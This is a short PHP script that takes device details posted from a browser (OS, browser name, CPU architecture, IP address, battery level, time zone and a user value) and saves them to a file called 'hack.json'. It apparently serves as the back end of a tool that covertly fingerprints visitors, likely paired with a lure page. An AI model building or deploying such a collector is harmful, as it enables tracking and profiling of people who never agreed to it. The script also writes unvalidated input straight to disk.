<?php
$ptf = $_POST['osname'];
$browname = $_POST['BrowserName'];
$CPname = $_POST['cpu'];
$ip = $_POST['getip'];
$bat = $_POST['bat'];
$time=$_POST['time'];
$user = $_POST['user'];
if($CPname == null){
  $CPname="not Found";
}
  $data=array('Os-Name'=>$ptf,
  'user'=>$user,
  'Os-Ip'=>$ip,
  'Browser-Name'=>$browname,
  'CPU-Architecture'=>$CPname,
  'batry'=>$bat,
  'Time-Zone'=>$time,);
  $jdata = json_encode($data);
  $f = fopen('hack.json','w');
  fwrite($f,$jdata);
  fclose($f);
?>